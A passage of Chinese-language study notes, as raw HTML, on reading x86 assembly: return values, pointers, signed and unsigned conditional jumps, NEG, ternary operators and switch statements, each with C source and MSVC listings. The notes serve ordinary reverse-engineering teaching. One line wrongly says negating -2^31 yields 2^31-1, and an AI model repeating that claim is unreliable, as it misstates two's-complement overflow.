cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">据</span><span class="mord cjk_fallback">栈</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">角</span><span class="mord cjk_fallback">度</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">看</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">外</span><span class="mord cjk_fallback">部</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">考</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">偏</span><span class="mord cjk_fallback">移</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">正</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">而</span><span class="mord cjk_fallback">局</span><span class="mord cjk_fallback">部</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">偏</span><span class="mord cjk_fallback">移</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">负</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">见</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">当</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">访</span><span class="mord cjk_fallback">问</span><span class="mord cjk_fallback">栈</span><span class="mord cjk_fallback">帧</span><span class="mord cjk_fallback">（</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">外</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">据</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">被</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">把</span><span class="mord cjk_fallback">汇</span><span class="mord cjk_fallback">编</span><span class="mord cjk_fallback">宏</span><span class="mord cjk_fallback">（</span><span class="mord cjk_fallback">例</span><span class="mord"><span class="mord cjk_fallback">如</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>）与EBP寄存器的值相加，从而求得所需地址。</p><p>当变量<em>a</em>的值存入EAX寄存器之后，f()函数通过各参数的地址依次进行乘法和加法运算，运算结果一直存储于EAX寄存器。此后EAX的值就可以直接作为返回值传递给调用方函数。调用方函数main()再把EAX的值当作参数传递给printf()函数。</p><h2 id="chap9-返回值"><a class="markdownIt-Anchor" href="#chap9-返回值"></a> Chap9 返回值</h2><p>在<strong>x86系</strong>统里，被调用方函数通常通过EA<strong>X寄存器返回运算结果</strong>。若返回值属于byte或char类型数据，返回值将<strong>存储于EAX寄存器的低8位——AL寄存器存储返回值</strong>。如果<strong>返回值是浮点float型数据，那么返回值将存储在FPU的ST(0)寄存器</strong>里。ARM系统的情况相对简单一些，它通常使用R0寄存器回传返回值。</p><h3 id="void类型的返回值"><a class="markdownIt-Anchor" href="#void类型的返回值"></a> void类型的返回值</h3><p>调用<code>main</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push envppush argvpush argccall mainpush eaxcall exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是<code>exit(main(argc,argv,envp));</code></p><p>如果声明main()的数据类型是void，则main()函数不会明确返回任何值（没有return指令）。不过在main()函数退出时，EAX寄存器还会存有数据，EAX寄存器保存的数据会被传递给exit()函数、成为后者的输入参数。通常EAX寄存器的值会是被调用方函数残留的确定数据，所以void类型函数的返回值、也就是主函数退出代码往往属于伪随机数（pseudorandom）</p><h4 id="返回值为结构体型数据"><a class="markdownIt-Anchor" href="#返回值为结构体型数据"></a> 返回值为结构体型数据</h4><p>调用方函数（caller）创建了数据结构、分配了数据空间，被调用的函数仅向结构体填充数据。其效果等同于返回结构体。</p><h2 id="chap10-指针"><a class="markdownIt-Anchor" href="#chap10-指针"></a> Chap10 指针</h2><p>指针通常用来帮助函数处理返回值。当函数需要返回多个值时，它通常都是通过指针传递返回值的。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">f1</span> <span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>sum<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>product<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token operator">*</span>sum<span class="token operator">=</span>x<span class="token operator">+</span>y<span class="token punctuation">;</span>         <span class="token operator">*</span>product<span class="token operator">=</span>x<span class="token operator">*</span>y<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> sum<span class="token punctuation">,</span> product<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token function">f1</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">456</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sum<span class="token punctuation">,</span> <span class="token operator">&amp;</span>product<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"sum=%d, product=%d\n"</span><span class="token punctuation">,</span> sum<span class="token punctuation">,</span> product<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">COMM     _product:DWORDCOMM     _sum:DWORD; 定义字符串常量 $SG2803，表示格式化输出的字符串 &quot;sum&#x3D;%d, product&#x3D;%d\n&quot;$SG2803 DB     &#39;sum&#x3D;%d, product&#x3D;%d&#39;, 0aH, 00H; 定义参数在栈帧中的偏移量_x$ &#x3D; 8             ; 参数 _x 在栈帧中的偏移量，大小为 4 字节_y$ &#x3D; 12            ; 参数 _y 在栈帧中的偏移量，大小为 4 字节_sum$ &#x3D; 16          ; _sum 在栈帧中的偏移量，大小为 4 字节_product$ &#x3D; 20      ; _product 在栈帧中的偏移量，大小为 4 字节; 定义 _f1 函数_f1   PROC      ; 将参数 _y 的值加载到 ecx 寄存器      mov  ecx, DWORD PTR _y$[esp-4]      ; 将参数 _x 的值加载到 eax 寄存器      mov  eax, DWORD PTR _x$[esp-4]      ; 计算 _x 和 _y 的和，结果存储到 edx 寄存器      lea  edx, DWORD PTR [eax+ecx]      ; 计算 _x 和 _y 的乘积，结果存储到 eax 寄存器      imul eax, ecx;eax&#x3D;eax*ecx      ; 将 _product 的地址加载到 ecx 寄存器      mov  ecx, DWORD PTR _product$[esp-4]      ; 保存 esi 寄存器的值，为后续操作做准备      push esi      ; 将 _sum 的地址加载到 esi 寄存器      mov  esi, DWORD PTR _sum$[esp]      ; 将和的结果存储到 _sum 指向的位置      mov  DWORD PTR [esi], edx      ; 将积的结果存储到 _product 指向的位置      mov  DWORD PTR [ecx], eax      ; 恢复 esi 寄存器的值      pop  esi      ; 返回到调用者      ret  0_f1   ENDP; 定义 _main 函数_main PROC      ; 将 _product 的地址压入栈中      push OFFSET _product      ; 将 _sum 的地址压入栈中      push OFFSET _sum      ; 将参数 456 压入栈中      push 456          ; 456 的十六进制表示为 0x1c8      ; 将参数 123 压入栈中      push 123          ; 123 的十六进制表示为 0x7b      ; 调用 _f1 函数      call _f1      ; 将 _product 的值加载到 eax 寄存器      mov  eax, DWORD PTR _product      ; 将 _sum 的值加载到 ecx 寄存器      mov  ecx, DWORD PTR _sum      ; 将 _product 和 _sum 的值作为参数，调用 printf 函数      push eax      push ecx      push OFFSET $SG2803      call DWORD PTR __imp__printf      ; 调整栈指针，清理参数      add  esp, 28          xor  eax, eax      ; 返回到调用者      ret  0_main ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="chap12-条件转移"><a class="markdownIt-Anchor" href="#chap12-条件转移"></a> Chap12 条件转移</h2><h3 id="数值比较"><a class="markdownIt-Anchor" href="#数值比较"></a> 数值比较</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">f_signed</span> <span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">></span>b<span class="token punctuation">)</span>          <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"a>b\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">==</span>b<span class="token punctuation">)</span>          <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"a==b\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">&lt;</span>b<span class="token punctuation">)</span>          <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"a&lt;b\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">f_unsigned</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">></span>b<span class="token punctuation">)</span>          <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"a>b\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">==</span>b<span class="token punctuation">)</span>          <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"a==b\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">&lt;</span>b<span class="token punctuation">)</span>          <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"a&lt;b\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">f_signed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">f_unsigned</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_a$ &#x3D;  8  ; size  &#x3D; 4 _b$ &#x3D; 12  ; size  &#x3D; 4 _f_unsigned PROC    push   ebp    mov    ebp, esp    mov    eax, DWORD PTR _a$[ebp]    cmp    eax, DWORD PTR _b$[ebp]    jbe    SHORT $LN3@f_unsigned    push   OFFSET $SG2761    ; &#39;a&gt;b&#39;    call   _printf    add    esp, 4$LN3@f_unsigned:    mov    ecx, DWORD PTR _a$[ebp]    cmp    ecx, DWORD PTR _b$[ebp]    jne    SHORT $LN2@f_unsigned    push   OFFSET $SG2763    ; &#39;a&#x3D;&#x3D;b&#39;    call   _printf    add    esp, 4$LN2@f_unsigned:    mov    edx, DWORD PTR _a$[ebp]    cmp    edx, DWORD PTR _b$[ebp]    jae    SHORT $LN4@f_unsigned    push   OFFSET $SG2765    ; &#39;a&lt;b&#39;    call   _printf    add    esp, 4LN4@f_unsigned:    Pop   ebp    Ret   0_f_unsigned ENDP_main   PROC        push    ebp        mov     ebp, esp        push    2        push    1        call    _f_signed        add     esp, 8        push    2        push    1        call    _f_unsigned        add     esp, 8        xor     eax, eax        pop     ebp        ret     0_main   ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>JLE，即“Jump if Less or Equal”。如果上一条CMP指令的第一个操作表达式小于或等于（不大于）第二个表达式，JLE将跳转到指令所标明的地址；如果不满足上述条件，则运行下一条指令，就本例而言程序将会调用printf()函数。第二个条件转移指令是JNE，“Jump if Not Equal”，如果上一条CMP的两个操作符不相等，则进行相应跳转。</li><li>JGE，即“Jump if Greater or Equal”。如果CMP的第一个表达式大于或等于第二个表达式（不小于），则进行跳转。这段程序里，如果三个跳转的判断条件都不满足，将不会调用printf()函数；不过，除非进行特殊干预，否则这种情况应该不会发生</li><li>经GCC编译后，f_unsigned()函数使用的条件转移指令是JBE（Jump if Below or Equal，相当于JLE）和JAE（Jump if Above or Equal，相当于JGE）。==JA/JAE/JB/JBE与JG/JGE/JL/JLE的区别，在于它们检查的标志位不同：前者检查借/进位标志位CF（1意味着小于）和零标志位ZF（1意味着相等），后者检查“SF XOR OF”（1意味着异号）和ZF。==从指令参数的角度看，<mark>前者适用于unsigned（无符号）类型数据的（CMP）运算，而后者的适用于signed（有符号）类型数据的运算。</mark></li></ul><h3 id="计算绝对值"><a class="markdownIt-Anchor" href="#计算绝对值"></a> 计算绝对值</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">my_abs</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>                 <span class="token keyword">return</span> <span class="token operator">-</span>i<span class="token punctuation">;</span>         <span class="token keyword">else</span>                 <span class="token keyword">return</span> i<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">i$ &#x3D; 8my_abs   PROC; ECX &#x3D; 输入值         test    ecx, ecx          ; 执行 ECX 和自身的按位与操作以设置标志; 检查输入值的符号; 如果符号为正则跳过 NEG 指令         jns     SHORT $LN2@my_abs ; 如果 ECX 为非负数，则跳转到 $LN2@my_abs; 取反值         neg     ecx               ; 如果 ECX 为负数，取反 ECX (ECX &#x3D; -ECX)$LN2@my_abs:; 将结果准备到 EAX:       mov    eax,   ecx    ; 将 ECX 的值复制到 EAX        ret     0                   ; 从过程返回（不清除任何参数）my_abs  ENDP                        ; 过程 my_abs 的结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>neg</code> 指令用于将寄存器或内存位置中的操作数取反。具体来说，它将<mark>操作数变为它的相反数（即取负值）</mark>。<code>neg</code> 指令实际上是计算二补数。</p><p>以下是 <code>neg</code> 指令的详细解释：</p><ul><li>如果操作数是正数，<code>neg</code> 会将其变为负数。</li><li>如果操作数是负数，<code>neg</code> 会将其变为正数。</li><li>如果操作数是零，<code>neg</code> 会保持其为零。</li></ul><p>在处理过程中，<code>neg</code> 指令会影响标志寄存器（Flags Register）中的以下标志：</p><ul><li><strong>CF（进位标志）</strong>：如果结果为非零，则设置 CF。</li><li><strong>ZF（零标志）</strong>：如果结果为零，则设置 ZF。</li><li><strong>SF（符号标志）</strong>：根据结果的最高位设置 SF。</li><li><strong>OF（溢出标志）</strong>：如果操作数是最小的负数，则设置 OF（例如，对于32位整数，-2^31 变为 2^31-1 会导致溢出）。</li></ul><p>假设 <code>ECX</code> 寄存器包含值 <code>5</code> 或 <code>-5</code>，在执行 <code>neg</code> 指令后的变化如下：</p><pre class="line-numbers language-none"><code class="language-none">mov ecx, 5     ; ECX &#x3D; 5neg ecx        ; ECX &#x3D; -5mov ecx, -5    ; ECX &#x3D; -5neg ecx        ; ECX &#x3D; 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="条件运算符"><a class="markdownIt-Anchor" href="#条件运算符"></a> 条件运算符</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">f</span> <span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> a<span class="token operator">==</span><span class="token number">10</span> <span class="token operator">?</span> <span class="token string">"it is ten"</span> <span class="token operator">:</span> <span class="token string">"it is not ten"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>在编译含有条件运算符的语句时，早期无优化功能的编译器会以编译“if/else”语句的方法进行处理。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">$SG746   DB       &#39;it is ten&#39;, 00H         ; 定义字符串 &quot;it is ten&quot; 并以空字符结尾$SG747   DB       &#39;it is not ten&#39;, 00H     ; 定义字符串 &quot;it is not ten&quot; 并以空字符结尾tv65 &#x3D; -4 ; 这是一个临时变量，存储在栈帧中的偏移量为 -4_a$ &#x3D; 8   ; 输入值在栈帧中的偏移量为 8_f       PROC         push     ebp                      ; 保存基指针 EBP         mov      ebp, esp                 ; 设置新的栈帧         push     ecx                      ; 保存 ECX 寄存器的值; 比较输入值是否为10         cmp      DWORD PTR _a$[ebp], 10   ; 比较位于栈帧偏移 _a$ 处的值是否为10; 如果不等于10，则跳转到 $LN3@f         jne      SHORT $LN3@f             ; 如果不等于10，跳转到 $LN3@f; 将指向字符串 &#39;it is ten&#39; 的指针存储到临时变量中         mov      DWORD PTR tv65[ebp], OFFSET $SG746 ; 将字符串 &quot;it is ten&quot; 的地址存储到 tv65 变量中; 跳转到退出标签         jmp      SHORT $LN4@f             ; 跳转到 $LN4@f$LN3@f:; 将指向字符串 &#39;it is not ten&#39; 的指针存储到临时变量中         mov      DWORD PTR tv65[ebp], OFFSET $SG747 ; 将字符串 &quot;it is not ten&quot; 的地址存储到 tv65 变量中$LN4@f:; 这是退出部分。从临时变量中复制指向字符串的指针到 EAX 中         mov      eax, DWORD PTR tv65[ebp] ; 将 tv65 变量中的值复制到 EAX 寄存器         mov      esp, ebp                 ; 恢复栈指针         pop      ebp                      ; 恢复基指针         ret      0                        ; 返回，清理栈上的参数_f       ENDP                              ; 过程 _f 结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启编译器优化</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">$SG792  DB       &#39;it is ten&#39;, 00H$SG793  DB       &#39;it is not ten&#39;, 00H_a$ &#x3D; 8 ; size &#x3D; 4_f      PROC; compare input value with 10        cmp      DWORD PTR _a$[esp-4], 10        mov      eax, OFFSET $SG792 ; &#39;it is ten&#39;; jump to $LN4@f if equal        je       SHORT $LN4@f        mov      eax, OFFSET $SG793 ; &#39;it is not ten&#39;$LN4@f:        ret      0 _f      ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="比较大小"><a class="markdownIt-Anchor" href="#比较大小"></a> 比较大小</h3><ul><li>启用优化功能后，编译器会尽可能避免使用条件转移指令</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">my_max</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">></span>b<span class="token punctuation">)</span>                <span class="token keyword">return</span> a<span class="token punctuation">;</span>        <span class="token keyword">else</span>                <span class="token keyword">return</span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">my_min</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">&lt;</span>b<span class="token punctuation">)</span>                <span class="token keyword">return</span> a<span class="token punctuation">;</span>        <span class="token keyword">else</span>                <span class="token keyword">return</span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没开启优化</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_a$ &#x3D; 8_b$ &#x3D; 12_my_min PROC        push     ebp        mov      ebp, esp        mov      eax, DWORD PTR _a$[ebp]; compare A and B:        cmp      eax, DWORD PTR _b$[ebp]; jump, if A is greater or equal to B:        jge      SHORT $LN2@my_min; reload A to EAX if otherwise and jump to exit        mov      eax, DWORD PTR _a$[ebp]        jmp      SHORT $LN3@my_min        jmp      SHORT $LN3@my_min ; this is redundant JMP$LN2@my_min:; return B        mov      eax, DWORD PTR _b$[ebp]$LN3@my_min:        pop      ebp        ret      0_my_min ENDP_a$ &#x3D; 8_b$ &#x3D; 12_my_max PROC        push     ebp        mov      ebp, esp        mov      eax, DWORD PTR _a$[ebp]; compare A and B:        cmp      eax, DWORD PTR _b$[ebp]; jump if A is less or equal to B:        jle      SHORT $LN2@my_max; reload A to EAX if otherwise and jump to exit        mov      eax, DWORD PTR _a$[ebp]        jmp      SHORT $LN3@my_max        jmp      SHORT $LN3@my_max ; this is redundant JMP$LN2@my_max:; return B        mov      eax, DWORD PTR _b$[ebp]$LN3@my_max:        pop      ebp        ret      0_my_max ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="chap13-switch"><a class="markdownIt-Anchor" href="#chap13-switch"></a> Chap13 Switch</h2><h3 id="case较少的情形"><a class="markdownIt-Anchor" href="#case较少的情形"></a> case较少的情形</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">f</span> <span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"zero\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"one\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"two\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"something unknown\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">f</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//test</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>msvs不开启优化</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">tv64 &#x3D; -4 ; size &#x3D; 4_a$ &#x3D; 8   ; size &#x3D; 4_f     PROC    push   ebp    mov    ebp, esp    push   ecx    mov    eax, DWORD PTR _a$[ebp]    mov    DWORD PTR tv64[ebp], eax    cmp    DWORD PTR tv64[ebp], 0    je     SHORT $LN4@f     cmp    DWORD PTR tv64[ebp], 1    je     SHORT $LN3@f    cmp    DWORD PTR tv64[ebp], 2    je     SHORT $LN2@f    jmp    SHORT $LN1@f$LN4@f:0    push   OFFSET $SG739 ; &#39;zero&#39;, 0aH, 00H    call   _printf    add    esp, 4    jmp    SHORT $LN7@f$LN3@f:1    push   OFFSET $SG741 ; &#39;one&#39;, 0aH, 00H    call   _printf    add    esp, 4    jmp    SHORT $LN7@f$LN2@f:2    push   OFFSET $SG743 ; &#39;two&#39;, 0aH, 00H    call   _printf    add    esp, 4    jmp    SHORT $LN7@f$LN1@f:default    push   OFFSET $SG745 ; &#39;something unknown&#39;, 0aH, 00H    call   _printf    add    esp, 4$LN7@f:ret    mov    esp, ebp    pop    ebp    ret    0 _f     ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现编译器把Switch翻译成了if else形式可以认为，switch()语句是一种旨在简化大量嵌套if()语句而设计的语法糖</p><p><mark>开启优化</mark></p><p><code>cl 1.c /Fa1.asm /Ox</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_a$ &#x3D; 8 ; size &#x3D; 4_f     PROC    mov    eax, DWORD PTR _a$[esp-4];eax&#x3D;a    sub    eax, 0;eax&#x3D;eax-0     je     SHORT $LN4@f;if a&#x3D;&#x3D;0    sub    eax, 1    je     SHORT $LN3@f;if a&#x3D;&#x3D;1    sub    eax, 1    je     SHORT 